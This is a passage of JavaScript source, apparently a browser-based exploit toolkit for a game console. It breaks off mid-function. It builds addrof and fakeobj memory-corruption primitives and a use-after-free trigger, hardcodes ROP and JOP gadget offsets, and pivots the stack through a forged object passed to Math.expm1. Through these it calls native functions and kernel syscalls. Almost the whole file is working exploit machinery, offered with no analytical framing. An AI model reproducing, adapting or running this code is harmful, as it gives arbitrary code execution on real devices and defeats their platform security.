"use strict";

//#region Contants
// used for addrof/fakeobj
var leak = leak || undefined;
var leak_addr = leak_addr || undefined;

// used for view
var slave = slave || undefined;
var master = master || undefined;

// used for rop
var scope = undefined;
var native_executable = undefined;
var fn_frame = undefined;
var fn_stack = undefined;
var fn_pivot = undefined;
var fn_insts = undefined;

// used for errno
var _error_addr = undefined;
var strerror_addr = undefined;

// used for base addrs
var jsc_base = undefined;
var libc_base = undefined;
var libkernel_base = undefined;
var eboot_base = undefined;

// used for eboot base
var native_invoke_addr = undefined;

// used for logging
var log = log || function() {};
var debug = debug || function() {};

// used for misc
var sceKernelGetModuleInfoForUnwind = undefined;
var _error = undefined;
var _strerror = undefined;

// user for syscalls
var syscalls = syscalls || new Map();
var read = undefined;
var write = undefined;
var open = undefined;
var close = undefined;
var fstat = undefined;
var sysctl = undefined;

// user for ROP/JOP gadgets
var gadgets = {
  init(base) {
    this.RET = base.add(0x4C);
    this.POP_R10_RET = base.add(0x19E297C);
    this.POP_R12_RET = base.add(0x3F3231);
    this.POP_R14_RET = base.add(0x15BE0A);
    this.POP_R15_RET = base.add(0x93CD7);
    this.POP_R8_RET = base.add(0x19BFF1);
    this.POP_R9_JO_RET = base.add(0x72277C);
    this.POP_RAX_RET = base.add(0x54094);
    this.POP_RBP_RET = base.add(0xC7);
    this.POP_RBX_RET = base.add(0x9D314);
    this.POP_RCX_RET = base.add(0x2C3DF3);
    this.POP_RDI_RET = base.add(0x93CD8);
    this.POP_RDX_RET = base.add(0x3A3DA2);
    this.POP_RSI_RET = base.add(0xCFEFE);
    this.POP_RSP_RET = base.add(0xC89EE);
    this.LEAVE_RET = base.add(0x50C33);
    this.MOV_RAX_RCX_RET = base.add(0x41015);
    this.PUSH_RAX_POP_RBP_RET = base.add(0x4E82B9);
    this.PUSH_RBP_POP_RCX_RET = base.add(0x1737EEE);
    this.PUSH_RBP_PUSH_R12_RET = base.add(0x195FDB1);
    this.MOV_RAX_QWORD_PTR_RDI_RET = base.add(0x36073);
    this.MOV_QWORD_PTR_RDI_RAX_RET = base.add(0x27FD0);
    this.POP_RDX_CLC_JMP_QWORD_PTR_RAX_2C = base.add(0x1E25C21);
    this.PUSH_RDX_CLC_JMP_QWORD_PTR_RAX_NEG_22 = base.add(0x1E25AA1);
    this.MOV_RAX_QWORD_PTR_RDI_CALL_QWORD_PTR_RAX_18 = base.add(0xA9849);
    this.MOV_RAX_QWORD_PTR_RDI_38_JMP_QWORD_PTR_RAX_18 = base.add(0x4F7C10);
    this.PUSH_RBP_MOV_RBP_RSP_MOV_RAX_QWORD_PTR_RDI_CALL_QWORD_PTR_RAX_20 = base.add(0x3F2A50);
    this.MOV_RDX_QWORD_PTR_RAX_MOV_RAX_QWORD_PTR_RDI_CALL_QWORD_PTR_RAX_10 = base.add(0x18B3B5);
    this.MOV_RDI_QWORD_PTR_RAX_20_MOV_RAX_QWORD_PTR_RDI_CALL_QWORD_PTR_RAX_18 = base.add(0x4E9FE5);
  }
};
//#endregion
//#region Classes
var BigInt = BigInt || class {
  /**
   * @param  {[number, number]|number|string|BigInt|ArrayLike<number>}
   */
  constructor() {
    var lo = 0;
    var hi = 0;

    switch (arguments.length) {
      case 0:
        break;
      case 1:
        var value = arguments[0];
        switch (typeof value) {
          case "boolean":
            lo = value ? 1 : 0;
            break;
          case "number":
            if (isNaN(value)) {
              throw new TypeError(`Number ${value} is NaN`);
            }

            if (Number.isInteger(value)) {
              if (!Number.isSafeInteger(value)) {
                throw new RangeError(`Integer ${value} outside safe 53-bit range`);
              }

              lo = value >>> 0;
              hi = Math.floor(value / 0x100000000) >>> 0;
            } else {
              BigInt.View.setFloat64(0, value, true);

              lo = BigInt.View.getUint32(0, true);
              hi = BigInt.View.getUint32(4, true);
            }

            break;
          case "string":
            if (value.startsWith("0x")) {
              value = value.slice(2);
            }

            if (value.length > 0x10) {
              throw new RangeError(`String ${value} is out of range !!`);
            }

            while (value.length < 0x10) {
              value = "0" + value;
            }

            for (var i = 0; i < 8; i++) {
              var start = value.length - 2 * (i + 1);
              var end = value.length - 2 * i;
              var b = value.slice(start, end);
              BigInt.View.setUint8(i, parseInt(b, 0x10));
            }

            lo = BigInt.View.getUint32(0, true);
            hi = BigInt.View.getUint32(4, true);

            break;
          default:
            if (value instanceof BigInt) {
              lo = value.lo;
              hi = value.hi;
              break;
            } else if (ArrayBuffer.isView(value) && value.byteLength === BigInt.View.byteLength) {
              BigInt.View.buffer.set(value);

              lo = BigInt.View.getUint32(0, true);
              hi = BigInt.View.getUint32(4, true);
            }

            throw new TypeError(`Unsupported value ${value} !!`);
        }
        break;
      case 2:
        hi = arguments[0] >>> 0;
        lo = arguments[1] >>> 0;

        if (!Number.isFinite(hi)) {
          throw new RangeError(`hi value ${hi} is not an integer !!`);
        }

        if (!Number.isFinite(lo)) {
          throw new RangeError(`lo value ${lo} is not an integer !!`);
        }
        break;
      default:
        throw new TypeError("Unsupported input !!");
    }

    this.lo = lo;
    this.hi = hi;
  }

  get d() {
    var hi_word = this.hi >>> 0x10;
    if (hi_word === 0xFFFF || hi_word === 0xFFFE) {
      throw new RangeError(`${this} cannot be represented as double`);
    }

    BigInt.View.setUint32(0, this.lo, true);
    BigInt.View.setUint32(4, this.hi, true);

    return BigInt.View.getFloat64(0, true);
  }

  get jsv() {
    var hi_word = this.hi >>> 0x10;
    if (hi_word === 0 || hi_word === 0xFFFF) {
      throw new RangeError(`${this} cannot be represented as JSValue`);
    }

    return this.sub(new BigInt(0x10000, 0)).d;
  }

  valueOf() {
    if (this.hi <= 0x1FFFFF) {
      return this.hi * 0x100000000 + this.lo;
    }

    BigInt.View.setUint32(0, this.lo, true);
    BigInt.View.setUint32(4, this.hi, true);

    var f = BigInt.View.getFloat64(0, true);
    if (!isNaN(f)) {
      return f;
    }

    throw new RangeError(`Unable to convert ${this} to primitive`);
  }

  toString() {
    BigInt.View.setUint32(0, this.lo, true);
    BigInt.View.setUint32(4, this.hi, true);

    var value = "0x";
    for (var i = 7; i >= 0; i--) {
      var c = BigInt.View.getUint8(i).toString(16).toUpperCase();
      value += c.length === 1 ? "0" + c : c;
    }

    return value;
  }

  swap() {
    [this.hi, this.lo] = [this.lo.swap32(), this.hi.swap32()];
  }

  getBit(idx) {
    if (idx < 0 || idx > 0x3F) {
      throw new RangeError(`Bit ${idx} is out of range !!`);
    }

    return (idx < 0x20 ? this.lo >>> idx : this.hi >>> (idx - 0x20)) & 1;
  }

  setBit(idx, value) {
    if (idx < 0 || idx > 0x3F) {
      throw new RangeError(`Bit ${idx} is out of range !!`);
    }

    if (idx < 0x20) {
      this.lo = (value ? this.lo | (1 << idx) : this.lo & ~(1 << idx)) >>> 0;
    } else {
      this.hi = (value ? this.hi | (1 << (idx - 0x20)) : this.hi & ~(1 << (idx - 0x20))) >>> 0;
    }
  }

  divmod(value) {
    value = value instanceof BigInt ? value : new BigInt(value);

    if (value === 0) {
      throw new Error("Division by zero");
    }

    var q = new BigInt();
    var r = new BigInt();
    for (var i = 0x3F; i >= 0; i--) {
      r = r.shl(1);

      if (this.getBit(i)) {
        r.setBit(0, true);
      }

      if (r.gte(value)) {
        r = r.sub(value);
        q.setBit(i, true);
      }
    }

    return { q, r };
  }

  cmp(value) {
    value = value instanceof BigInt ? value : new BigInt(value);
    return this.hi !== value.hi ? (this.hi > value.hi ? 1 : -1) 
        : this.lo !== value.lo ? (this.lo > value.lo ? 1 : -1)
        : 0;
  }

  gt(value) {
    return this.cmp(value) > 0;
  }

  gte(value) {
    return this.cmp(value) >= 0;
  }

  lt(value) {
    return this.cmp(value) < 0;
  }

  lte(value) {
    return this.cmp(value) <= 0;
  }

  eq(value) {
    value = value instanceof BigInt ? value : new BigInt(value);
    return this.hi === value.hi && this.lo === value.lo;
  }

  neq(value) {
    value = value instanceof BigInt ? value : new BigInt(value);
    return this.hi !== value.hi || this.lo !== value.lo;
  }
  
  add(value) {
    value = value instanceof BigInt ? value : new BigInt(value);

    var lo = this.lo + value.lo;
    var c = lo > 0xFFFFFFFF ? 1 : 0;
    var hi = this.hi + value.hi + c;
    if (hi > 0xFFFFFFFF) {
      throw new RangeError("add overflowed !!");
    }

    return new BigInt(hi, lo);
  }

  sub(value) {
    value = value instanceof BigInt ? value : new BigInt(value);

    if (this.lt(value)) {
      throw new RangeError("sub underflowed !!");
    }

    var b = this.lo < value.lo ? 1 : 0;
    var hi = this.hi - value.hi - b;
    var lo = this.lo - value.lo;

    return new BigInt(hi, lo);
  }

  mul(value) {
    value = value instanceof BigInt ? value : new BigInt(value);

    var m00 = Math.imul(this.lo, value.lo);
    var m01 = Math.imul(this.lo, value.hi);
    var m10 = Math.imul(this.hi, value.lo);
    var m11 = Math.imul(this.hi, value.hi);

    var d = m01 + m10;
    var lo = m00 + (d << 0x20);
    var c = lo > 0xFFFFFFFF ? 1 : 0;
    var hi = m11 + (d >>> 0x20) + c;
    if (hi > 0xFFFFFFFF) {
      throw new Error("mul overflowed !!");
    }

    return new BigInt(hi, lo);
  }

  div(value) {
    return this.divmod(value).q;
  }

  mod(value) {
    return this.divmod(value).r;
  }

  xor(value) {
    value = value instanceof BigInt ? value : new BigInt(value);

    var lo = (this.lo ^ value.lo) >>> 0;
    var hi = (this.hi ^ value.hi) >>> 0;

    return new BigInt(hi, lo);
  }

  and(value) {
    value = value instanceof BigInt ? value : new BigInt(value);

    var lo = (this.lo & value.lo) >>> 0;
    var hi = (this.hi & value.hi) >>> 0;

    return new BigInt(hi, lo);
  }

  or(value) {
    value = value instanceof BigInt ? value : new BigInt(value);

    var lo = (this.lo | value.lo) >>> 0;
    var hi = (this.hi | value.hi) >>> 0;

    return new BigInt(hi, lo);
  }

  not() {
    var lo = ~this.lo >>> 0;
    var hi = ~this.hi >>> 0;

    return new BigInt(hi, lo);
  }

  shl(count) {
    if (count < 0 || count > 0x3F) {
      throw new RangeError(`Shift ${count} bits out of range !!`);
    }

    if (count === 0) {
      return new BigInt(this);
    }

    var lo = count < 0x20 ? (this.lo << count) >>> 0 : 0;
    var hi = count < 0x20 ? ((this.hi << count) | (this.lo >>> (0x20 - count))) >>> 0 : (this.lo << (count - 0x20)) >>> 0;

    return new BigInt(hi, lo);
  }

  shr(count) {
    if (count < 0 || count > 63) {
      throw new RangeError(`Shift ${count} bits out of range !!`);
    }

    if (count === 0) {
      return new BigInt(this);
    }

    var lo = count < 0x20 ? ((this.lo >>> count) | (this.hi << (0x20 - count))) >>> 0 : this.hi >>> (count - 0x20);
    var hi = count < 0x20 ? this.hi >>> count : 0;

    return new BigInt(hi, lo);
  }
};

class Frame {
  constructor(list) {
    if (!Array.isArray(list)) {
      throw new Error(`Input frame is not an array !!`);
    }

    if (list.length === 0) {
      throw new Error("Empty frame size");
    }

    this.size = list.length * 8;
    this.addr = alloc(this.size);

    for (var i = 0 ; i < list.length; i++) {
      var name = list[i];

      if (typeof name !== "string") {
        throw new TypeError(`${name} not a string !!`);
      } 

      if (name in this) {
        throw new Error(`Duplicated local variable ${name} !!`);
      }
      
      this[name] = i;
    }
  }

  reset() {
    bzero(this.addr, this.size);
  }

  instof(name) {
    var as_value = false;

    if (name.startsWith("[") && name.endsWith("]")) {
      name = name.slice(1, -1);
      as_value = true;
    }

    if (name in this) {
      return as_value ? this.get_value(name) : this.addrof(name);
    }

    throw new Error(`${name} not in frame !!`); 
  }

  addrof(name) {
    if (!(name in this)) {
      throw new Error(`${name} not in frame !!`);
    }

    return this.addr.add(this[name] * 8);
  }

  get_value(name) {
    if (!(name in this)) {
      throw new Error(`${name} not in frame !!`);
    }

    return view(this.addr).getBigInt(this[name] * 8, true);
  }

  set_value(name, value) {
    if (!(name in this)) {
      throw new Error(`${name} not in frame !!`);
    }

    view(this.addr).setBigInt(this[name] * 8, value, true);
  }

  valueof(insts, name) {
    insts.push(`[${name}]`);
  }

  store(insts, name) {
    if (!(name in this)) {
      throw new Error(`${name} not in frame !!`);
    }

    insts.push(gadgets.POP_RDI_RET);
    insts.push(name);
    insts.push(gadgets.MOV_QWORD_PTR_RDI_RAX_RET);
  }

  load(insts, name) {
    if (!(name in this)) {
      throw new Error(`${name} not in frame !!`);
    }
    
    insts.push(gadgets.POP_RDI_RET);
    insts.push(name);
    insts.push(gadgets.MOV_RAX_QWORD_PTR_RDI_RET);
  }

  pop(insts, gadget, name) { 
    this.load(insts, name);

    insts.push(gadgets.PUSH_RAX_POP_RBP_RET);
    insts.push(gadgets.POP_R12_RET);
    insts.push(gadget);
    insts.push(gadgets.PUSH_RBP_PUSH_R12_RET);
  }
};

class Stack {
  constructor(size) {
    if (size % 8 !== 0) {
      throw new Error("Invalid stack size, not aligned by 8 bytes");
    }

    if (size < 0x1000) {
      throw new Error("Invalid stack size, minimal size is 0x1000 to init ROP");
    }

    this.size = size;
    this.addr = alloc(size);
    this.reset();
  }

  reset() {
    this.sp = this.size;
  }

  push(value) {
    if (this.sp < 8) {
      throw new Error("Stack full !!");
    }

    this.sp -= 8;
    view(this.addr).setBigInt(this.sp, value, true);
  }

  prepare(insts, frame) {
    bzero(this.addr, this.size);

    for (var i = insts.length - 1; i >= 0; i--) {
      var inst = insts[i];

      if (typeof inst === "string") {
        inst = frame.instof(inst);
      }

      this.push(inst);
    }
  }
};

class Pivot {
  constructor() {
    this.jop_store_addr = alloc(8);
    this.jop_table_addr = alloc(0x56);
    this.jop_table_rela_addr = this.jop_table_addr.add(0x22);

    view(this.jop_store_addr).setBigInt(0, this.jop_table_rela_addr, true);
    view(this.jop_table_addr).setBigInt(0, gadgets.POP_RSP_RET, true);
    
    view(this.jop_table_rela_addr).setBigInt(0x10, gadgets.PUSH_RDX_CLC_JMP_QWORD_PTR_RAX_NEG_22, true);
    view(this.jop_table_rela_addr).setBigInt(0x18, gadgets.POP_RDX_CLC_JMP_QWORD_PTR_RAX_2C, true);
    view(this.jop_table_rela_addr).setBigInt(0x20, gadgets.MOV_RDX_QWORD_PTR_RAX_MOV_RAX_QWORD_PTR_RDI_CALL_QWORD_PTR_RAX_10, true);
    view(this.jop_table_rela_addr).setBigInt(0x2C, gadgets.PUSH_RBP_MOV_RBP_RSP_MOV_RAX_QWORD_PTR_RDI_CALL_QWORD_PTR_RAX_20, true);
  }
  
  prepare(stack) {
    view(this.jop_table_rela_addr).setBigInt(0, stack.addr.add(stack.sp), true);
  }
};

class SyscallError extends Error {
  constructor(message) {
    super(`${message}\n\terrno ${errno()}: ${strerror()}`);
    this.name = "SyscallError";
  }
}

class NativeFunction {
  constructor(input, ret) {
    this.ret = ret;

    if (input instanceof BigInt) {
      this.addr = input;
    } else if (typeof input === "number") {
      if (!syscalls.has(input)) {
        throw new Error(`Syscall ${input} not found !!`);
      }

      this.addr = syscalls.get(input);
    }
  }

  invoke() {
    if (arguments.length > 6) {
      throw new Error("More than 6 arguments is not supported !!");
    }

    fn_frame.set_value("rip", this.addr);
    fn_frame.set_value("rax", 0);

    var regs = ["rdi", "rsi", "rdx", "rcx", "r8", "r9"];

    for (var i = 0; i < regs.length; i++) {
      var reg = regs[i];

      var value = i in arguments ? arguments[i] : 0;

      switch (typeof value) {
        case "boolean":
        case "number":
          break;
        case "string":
          value = value.cstr();
          break;
        default:
          if (!(value instanceof BigInt)) {
            throw new Error(`Invalid value of type ${typeof value} at arg ${i}`);
          }
          break;
      }

      fn_frame.set_value(reg, value);
    }

    fn_stack.prepare(fn_insts, fn_frame);
    fn_pivot.prepare(fn_stack)

    var pivot_obj = { a: 0, b: 0, c: 0 };
    var pivot_obj_addr = addrof(pivot_obj);

    view(pivot_obj_addr).setBigInt(0x18, gadgets.MOV_RDI_QWORD_PTR_RAX_20_MOV_RAX_QWORD_PTR_RDI_CALL_QWORD_PTR_RAX_18, true);
    view(pivot_obj_addr).setBigInt(0x20, fn_pivot.jop_store_addr, true);

    var empty_jscell = view(addrof({})).getBigInt(0, true);
    view(pivot_obj_addr).setBigInt(0, empty_jscell, true);

    Math.expm1(0, pivot_obj);

    var result;
    if (this.ret) {
      result = fn_frame.get_value("rax");

      switch (this.ret) {
        case "bigint":
          break;
        case "boolean":
          result = result.eq(1);
          break;
        case "string":
          result = result.neq(0) ? String.from(result) : "";
          break;
        default:
          throw new Error(`Unsupported return type ${this.ret}`);
      }
    }

    fn_frame.reset();
    fn_stack.reset();

    return result;
  }

  chain() {
    if (arguments.length < 1) {
      throw new Error("insts argument is required to chain with !!");
    }

    if (!Array.isArray(arguments[0])) {
      throw new Error(`insts argument is not an array !!`);
    }

    if (arguments.length > 7) {
      throw new Error("More than 6 arguments is not supported !!");
    }

    var regs = [
      gadgets.POP_RDI_RET,
      gadgets.POP_RSI_RET,
      gadgets.POP_RDX_RET,
      gadgets.POP_RCX_RET,
      gadgets.POP_R8_RET,
      gadgets.POP_R9_JO_RET,
    ];

    var insts = arguments[0];

    insts.push(gadgets.POP_RAX_RET);
    insts.push(0);

    for (var i = 1; i < arguments.length; i++) {
      var reg = regs[i - 1];

      var value = arguments[i];

      insts.push(reg);

      switch (typeof value) {
        case "boolean":
        case "number":
          break;
        case "string":
          value = value.cstr();
          break;
        default:
          if (!(value instanceof BigInt)) {
            throw new Error(`Invalid value at arg ${i}`);
          }
          break;
      }

      insts.push(value);
    }

    insts.push(this.addr);
  }
};

class Struct {
  constructor(name, fields) {
    if (name in Struct.structs) {
      return Struct.structs[name];
    }

    if (!Array.isArray(fields)) {
      throw new Error(`Input fields is not an array !!`);
    }

    if (fields.length === 0) {
      throw new Error(`Empty fields array !!`);
    }

    var offset = 0;
    var alignof = 1;
    for (var field of fields) {
      var size = this.field_size(field);
      var align = this.field_align(field);
      var count = (typeof field.count === "number") ? field.count : 1;

      field.offset = offset = offset.align_up(align);

      offset += size * count;

      alignof = Math.max(alignof, align);
    }

    this.name = name;
    this.fields = fields;
    this.sizeof = offset.align_up(alignof);
    this.alignof = alignof;

    debug(`registering ${this.name}: sizeof: ${this.sizeof}, alignof: ${this.alignof}`);

    Struct.structs[this.name] = this;
  }

  from(addr) {
    var instance = {};

    instance.addr = addr;
    instance.struct = this;
    
    instance.from_at = function(i) {
      if (i < 0) {
        throw new RangeError("Index out of range !!");
      }

      var addr = this.addr.add(i * this.struct.sizeof);
      return this.struct.from(addr);
    }

    instance.from_put = function(i, value) {
      if (!(value.struct instanceof this.struct)) {
        throw new TypeError(`Expected instanceof ${this.struct.name} got ${value.struct.name}`);
      }

      var src = value.addr;
      var dst = this.addr.add(i * this.struct.sizeof);
      copy(dst, src, this.struct.sizeof);
    }

    for (var field of this.fields) {
      this.define_field(instance, field);
    }

    return instance;
  }

  field_size(field) {
    if (field.type.includes("|")) {
      return Math.max(...field.type.split("|").map((t) => this.type_size(t)));
    }

    return this.type_size(field.type);
  }

  field_align(field) {
    if (field.type.includes("|")) {
      return Math.max(...field.type.split("|").map((t) => this.type_align(t)));
    }

    return this.type_align(field.type);
  }

  type_size(type) {
    if (type.endsWith("*")) {
      return 8;
    } else if (type in Struct.structs) {
      return Struct.structs[type].sizeof;
    } else {
      return this.primitive_size(type);
    }
  }

  type_align(type) {
    if (type.endsWith("*")) {
      return 8;
    } else if (type in Struct.structs) {
      return Struct.structs[type].alignof;
    } else {
      return this.primitive_size(type);
    }
  }

  primitive_size(type) {
    var bits = type.replace(/\D/g, "");
    if (bits % 8 !== 0) {
      throw new Error(`Invalid primitive type ${type}`);
    }

    return bits / 8;
  }

  define_field(instance, field) {
    var name = field.name;
    var type = field.type;
    var offset = field.offset;
    var count = (typeof field.count === "number") ? field.count : 1;

    var is_array = count > 1;
    var is_union = type.includes("|");
    var is_pointer = type.endsWith("*");
    var is_struct = !is_union && !is_pointer && type in Struct.structs;
    var is_primitive = !is_union && !is_pointer && !(type in Struct.structs);

    var union_types = is_union ? type.split("|") : undefined;
    var pointer_type = is_pointer ? type.slice(0, -1) : undefined;

    var size = is_pointer ? 8 : is_primitive ? this.type_size(type) : is_struct ? Struct.structs[type].sizeof : 0;

    var getter = function(i) {
      if (i < 0) {
        throw new RangeError("Index out of range !!");
      }

      var addr = instance.addr.add(offset + i * size);

      if (is_union) {
        var container = {};
        for (var uttype of union_types) {
          var ut_is_pointer = uttype.endsWith("*");
          var ut_is_struct = uttype in Struct.structs;
          var ut_size = instance.struct.type_size(uttype);
          
          if (ut_is_pointer) {
            var ut_pointer_type = uttype.slice(0, -1);
          
            Object.defineProperty(container, uttype, {
              get() {
                var ptr = view(addr).getBigInt(0, true);
                if (ptr === 0) {
                  return undefined;
                }
              
                if (ut_pointer_type in Struct.structs) {
                  var struct = Struct.structs[ut_pointer_type];
                  return struct.from.call(struct, ptr);
                }
              
                return {
                  get() { return Struct.read(ptr, uttype); },
                  set(value) { Struct.write(ptr, uttype, value); }
                };
              },
              set(value) { Struct.write(addr, uttype, value); }
            });
          
            continue;
          }
          
          if (ut_is_struct) {
            Object.defineProperty(container, uttype, {
              get() { return Struct.structs[uttype].from.call(Struct.structs[uttype], addr); },
              set(value) { copy(addr, value.addr, ut_size); }
            });
          
            continue;
          }
          
          Object.defineProperty(container, uttype, {
            get() { return Struct.read(ptr, uttype); },
            set(value) { Struct.write(ptr, uttype, value); }
          });
        }
        
        return container;
      } else if (is_pointer) {
        var ptr = view(addr).getBigInt(0, true);
        if (ptr === 0) {
          return undefined;
        }
      
        if (pointer_type in Struct.structs) {
          var struct = Struct.structs[pointer_type];
          return struct.from.call(struct, ptr);
        }
      
        return {
          get() { return Struct.read(ptr, pointer_type); },
          set(value) { Struct.write(ptr, pointer_type, value); },
        };
      } else if (is_primitive) {
        return Struct.read(addr, type);
      } else if (is_struct) {
        var struct = Struct.structs[type];
        return struct.from.call(struct, addr);
      }
      
      throw new TypeError(`Unknown field type ${this.type}`);
    }

    var setter = function(i, value) {
      if (i < 0) {
        throw new RangeError("Index out of range !!");
      }
    
      var addr = instance.addr.add(offset + i * size);
    
      if (is_union) {
        return;
      } else if (is_pointer) {
        Struct.write(addr, "Uint64", value);
        return;
      } else if (is_primitive) {
        Struct.write(addr, type, value);
        return;
      } else if (is_struct) {
        copy(addr, value.addr, size);
        return;
      }
    
      throw new Error(`Cannot assign to field ${this.name}`);
    }

    if (is_array) {
      Object.defineProperty(instance, name, {
        get() {
          return {
            at(i) { return getter(i); },
            put(i, value) { setter(i, value); },
            length() { return count; }
          };
        },
        set(value) { copy(this.addr, value.addr, size * count); },
        enumerable: true
      });
    } else {
      Object.defineProperty(instance, name, {
        get() { return getter(0); },
        set(value) { setter(0, value); },
        enumerable: true
      });
    }
  }

  static read(addr, type) {
    var v = view(addr);
    switch (type) {
      case "Int8":
        return v.getInt8(0);
      case "Uint8":
        return v.getUint8(0);
      case "Int16":
        return v.getInt16(0, true);
      case "Uint16":
        return v.getUint16(0, true);
      case "Int32":
        return v.getInt32(0, true);
      case "Uint32":
        return v.getUint32(0, true);
      case "Int64":
      case "Uint64":
        return v.getBigInt(0, true);
      default:
        throw new Error(`Unsupported type ${type} !!`);
    }
  }

  static write(addr, type, value) {
    var v = view(addr);
    switch (type) {
      case "Int8":
        return v.setInt8(0, value);
      case "Uint8":
        return v.setUint8(0, value);
      case "Int16":
        return v.setInt16(0, value, true);
      case "Uint16":
        return v.setUint16(0, value, true);
      case "Int32":
        return v.setInt32(0, value, true);
      case "Uint32":
        return v.setUint32(0, value, true);
      case "Int64":
      case "Uint64":
        return v.setBigInt(0, value, true);
      default:
        throw new Error(`Unsupported type ${type} !!`);
    }
  }
}
//#endregion
//#region Extension
Number.prototype.align_up = function (alignment) {
  var mask = alignment - 1;
  return (this + mask) & ~mask;
};

Number.prototype.align_down = function (alignment) {
  return this & ~(alignment - 1);
};

Number.prototype.swap32 = function () {
  if (Number.isInteger(this) && this >= 0 && this <= 0xFFFFFFFF) {
    return ((this & 0xFF) << 24) | ((this & 0xFF00) << 8) | ((this >>> 8) & 0xFF00) | ((this >>> 24) & 0xFF);
  }

  throw new RangeError(`${value} is not 32-bit number`);
};

DataView.prototype.getBigInt = function (byteOffset, littleEndian) {
  littleEndian = typeof littleEndian === "undefined" ? false : littleEndian;

  var lo = this.getUint32(byteOffset, littleEndian);
  var hi = this.getUint32(byteOffset + 4, littleEndian);

  return new BigInt(hi, lo);
};

DataView.prototype.setBigInt = function (byteOffset, value, littleEndian) {
  littleEndian = typeof littleEndian === "undefined" ? false : littleEndian;
  value = value instanceof BigInt ? value : new BigInt(value); 

  this.setUint32(byteOffset, value.lo, littleEndian);
  this.setUint32(byteOffset + 4, value.hi, littleEndian);
};

DataView.prototype.get_backing = function () {
  return view(addrof(this)).getBigInt(0x10, true);
};

DataView.prototype.set_backing = function (addr) {
  view(addrof(this)).setBigInt(0x10, addr, true);
};

DataView.prototype.set_length = function (length) {
  if (!Number.isInteger(length) || length < -0x80000000 || length > 0x7FFFFFFF) {
    throw new RangeError(`${length} is not 32-bit signed number`);
  }

  view(addrof(this)).setInt32(0x18, length, true);
};

Uint8Array.prototype.get_backing = function () {
  return view(addrof(this)).getBigInt(0x10, true);
};

Uint8Array.prototype.set_backing = function (addr) {
  view(addrof(this)).setBigInt(0x10, addr, true);
};

Uint8Array.prototype.set_length = function (length) {
  if (!Number.isInteger(length) || length < -0x80000000 || length > 0x7FFFFFFF) {
    throw new RangeError(`${length} is not 32-bit signed number`);
  }

  view(addrof(this)).setInt32(0x18, length, true);
};

String.prototype.pad_start = function (length) {
  return ("0".repeat(length) + this).slice(-length);
};

String.prototype.pad_end = function (length) {
  return (this + "0".repeat(length)).slice(0, length);
};

String.prototype.cstr = function () {
  var bytes = new Uint8Array(this.length + 1);

  for (var i = 0; i < this.length; i++) {
    bytes[i] = this.charCodeAt(i) & 0xFF;
  }

  bytes[this.length] = 0;
  return bytes.get_backing();
};
//#endregion
//#region Static
BigInt.View = new DataView(new ArrayBuffer(8));
Struct.structs = {};

DataView.from = function (addr, sz) {
  var v = new DataView(new ArrayBuffer(0));

  v.set_backing(addr);
  v.set_length(sz);

  return v;
};

Uint8Array.from = function (addr, sz) {
  var arr = new Uint8Array(0);

  arr.set_backing(addr);
  arr.set_length(sz);

  return arr;
};

String.from = function (addr, sz) {
  sz = typeof sz === "undefined" ? -1 : sz;

  var chunk;
  var str = "";
  if (addr.hasOwnProperty("arr")) {
    chunk = 0x8000;
    for (var i = 0; i < addr.arr.length; i += chunk) {
      str += String.fromCodePoint(...addr.arr.subarray(i, i + chunk));
    }
  } else {
    var u8 = Uint8Array.from(addr, sz);

    if (sz === -1) {
      for (var i = 0; i < 0xFFFFFFFF; i++) {
        if (u8[i] === 0) {
          sz = i;
          break;
        }
      }
    
      if (sz === -1) {
        throw new Error("Not a null-terminated string !!");
      }
    }

    chunk = Math.min(sz, 0x8000);
    for (var i = 0; i < sz; i += chunk) {
      str += String.fromCodePoint(...Uint8Array.from(addr.add(i), chunk));
      chunk = Math.min(sz - i, 0x8000);
    }
  }
  
  return str;
};
//#endregion
//#region Functions
function view(addr) {
  if (!(addr instanceof BigInt)) {
    throw new Error(`${addr} is not a BigInt !!`);
  }

  if (addr.eq(0)) {
    throw new Error("Empty addr !!");
  }

  if (addr.lo !== master[4] || addr.hi !== master[5]) {
    master[4] = addr.lo;
    master[5] = addr.hi;
  }

  return slave;
};

function addrof(obj) {
  leak.obj = obj;
  return view(leak_addr).getBigInt(0x10, true);
};

function fakeobj(addr) {
  view(leak_addr).setBigInt(0x10, addr, true);
  return leak.obj;
};

function alloc(sz) {
  var arr =  new Uint8Array(sz);
  var addr = arr.get_backing();
  addr.arr = arr;
  return addr;
};

function dispose(addr) {
  if (addr.hasOwnProperty("arr")) {
    delete addr.arr;
  }
};

function copy(dst, src, sz) {
  var src_u8 = src.hasOwnProperty("arr") ? src.arr : Uint8Array.from(src, sz);
  var dst_u8 = dst.hasOwnProperty("arr") ? dst.arr : Uint8Array.from(dst, sz);

  dst_u8.set(src_u8);
};

function bset(addr, sz, value) {
  if (!Number.isInteger(value) || value < 0 || value > 0xFF) {
    throw new RangeError(`${value} is not 8-bit number`);
  }

  var u8 = addr.hasOwnProperty("arr") ? addr.arr : Uint8Array.from(addr, sz);
  
  u8.set(new Array(sz).fill(value));
};

function bzero(addr, sz) {
  var u8 = addr.hasOwnProperty("arr") ? addr.arr : Uint8Array.from(addr, sz);

  u8.set(new Uint8Array(sz));
};

function errno() {
  if (!_error) {
    throw new Error("_error undefined !!");
  }

  return view(_error.invoke()).getUint32(0, true);
};

function strerror() {
  if (!_strerror) {
    throw new Error("strerror undefined !!");
  }

  return _strerror.invoke(errno());
};

function make_uaf(arr) {
  var o = {};
  for (var i in { xx: "" }) {
    for (i of [arr]) {}
    o[i];
  }
};

function base_addr(func_addr) {
  var module_info_addr = alloc(ModuleInfoForUnwind.sizeof);

  var module_info = ModuleInfoForUnwind.from(module_info_addr);

  module_info.st_size = 0x130;
  
  if (sceKernelGetModuleInfoForUnwind.invoke(func_addr, 1, module_info.addr).neq(0)) {
    throw new Error(`Unable to get ${func_addr} base addr`);
  }

  var base_addr = module_info.seg0_addr;

  dispose(module_info_addr);

  return base_addr;
};

function notify(msg) {
  var notify_addr = alloc(NotificationRequest.sizeof);

  var notify = NotificationRequest.from(notify_addr);

  for (var i = 0; i < msg.length; i++) {
    notify.message.put(i, msg.charCodeAt(i) & 0xFF);
  }

  notify.message.put(msg.length, 0);

  var fd = open.invoke("/dev/notification0", 1, 0);
  if (fd.eq(-1)) {
    throw new SyscallError("Unable to open /dev/notification0 !!");
  }

  if (write.invoke(fd, notify.addr, NotificationRequest.sizeof).eq(-1)) {
    throw new SyscallError(`Unable to write to fd ${fd} !!`);
  }

  if (close.invoke(fd).neq(0)) {
    throw new SyscallError(`Unable to close fd ${fd} !!`);
  }

  dispose(notify_addr);
};

function sdk_version() {
  var name_addr = alloc(8);
  var out_addr = alloc(8);
